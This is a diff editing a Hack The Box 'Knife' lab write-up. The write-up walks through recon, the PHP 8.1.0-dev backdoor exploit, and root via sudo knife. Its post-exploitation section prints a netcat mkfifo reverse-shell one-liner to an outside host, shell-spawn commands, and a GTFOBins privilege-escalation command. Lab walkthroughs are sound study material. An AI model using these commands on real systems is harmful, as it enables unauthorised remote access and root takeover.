@@ -1,9 +1,6 @@
 <b>
-# Description
-Knife is an easy linux box
-
 # Information Gathering
-I start by pinging the box 4 times to ensure stable connection
+I started by pinging the box 4 times to ensure stable connection
 `ping -c 4 10.10.10.242`
 ```
 PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
@@ -12,7 +9,7 @@ PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
 64 bytes from 10.10.10.242: icmp_seq=3 ttl=63 time=110 ms
 64 bytes from 10.10.10.242: icmp_seq=4 ttl=63 time=109 ms
 ```
-After confirming good connection i run nmap with `-Pn` to skip testing if the target is alive, `-sVC` for version and additional information
+After confirming good connection i ran `nmap` with `-Pn` to skip testing if the target is alive and `-sVC` for version and additional information
 `nmap -sVC -Pn 10.10.10.242`
 ```
 Nmap scan report for 10.10.10.242
@@ -27,12 +24,12 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-I also ran whatweb to gather further information for the website
+I also ran `whatweb` with `-a 3` for aggressive (comprehensive) information gathering about the website
 `whatweb -a 3 10.10.10.242`
 ```
 http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
 ```
-The website doesn't appear to have any links or directories so i try dirbusting with `feroxbuster` but no use either
+The website didn't appear to have any links or directories so i try dirbusting with `feroxbuster` but no use either
 `feroxbuster -r -k -E -g -C 400,403,404 --auto-tune -u http://10.10.10.242/`
 ```
 200      GET      220l      526w     5815c http://10.10.10.242/
@@ -62,31 +59,34 @@ I try `dirsearch` just to be sure but no luck either
 [12:10:44] 403 -  277B  - /server-status/ 
 ```
 # Vulnerability Assessment
-The server runs `Apache 2.4.41` and uses `PHP 8.1.0-dev`
+The server was running `Apache 2.4.41` and using `PHP 8.1.0-dev`
 Looking up `php 8.1.0 exploit` leads to this:
 https://www.exploit-db.com/exploits/49933
 
 The cause of the exploit was an early realease which contained a backdoor
-The backdoor was removed but any server that still runs this version, an attacker can execute arbitrary code by sending the `User-Agentt` header
+The backdoor was removed but any server that still runs this version allows an attacker to execute arbitrary code by sending the `User-Agentt` header
 # Exploitation
-Running the exploit, it asks for full URL: `http://10.10.10.242/`
-It spawned pseudo shell
+Running the exploit, it asked for full URL: `http://10.10.10.242/`
+After that it spawned `pseudo shell`
 # Post-Exploitation
-The job control is turned off so i couldnt spawn interactive shell no matter what i tried:
+The job control is turned off so i couldn't spawn interactive shell no matter what i tried:
 `/bin/sh -i`
 `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 `perl —e 'exec "/bin/sh";'`
 
-In that case, i opened netcat listner on port 4444 and executed reverse shell on the pseudo shell
+In that case, i opened `netcat` listner on port 4444 and executed reverse shell on the `pseudo shell`
 `nc -lvnp 4444` (listener)
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)
 
-Having reverse shell from `nc`, i upgraded to interactive shell
+Having reverse shell from `nc`, i upgraded to `interactive shell`
 `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 
-Browsing through directories, in the home directory there is only one called `james`, the flag can be found inside `/home/james/user.txt`
-After that i started checking common things like the `sudo --version`, the `uname -a` but exploits didn't work
-Checking `sudo -l` to see what i can run as sudo led to this
+There was only 1 directory inside `/home` called `james` (which is who we are - `whoami`), the user flag can be found inside `/home/james/user.txt`
+After that i started checking common things but the exploits for them didn't work
+- `sudo --version` (sudo version)
+- `uname -a` (system information)
+
+Running `sudo -l` to see what i can run as sudo led to this
 ```
 User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
@@ -94,6 +94,6 @@ User james may run the following commands on knife:
 Looking up `usr/bin/knife exploit` gave me this
 https://gtfobins.github.io/gtfobins/knife/
 
-Running the `sudo knife exec -E 'exec "/bin/sh"'` allowed becoming root
+Running the `sudo knife exec -E 'exec "/bin/sh"'` allowed me to become root
 The flag was located at `/root/root.txt`
 </b>
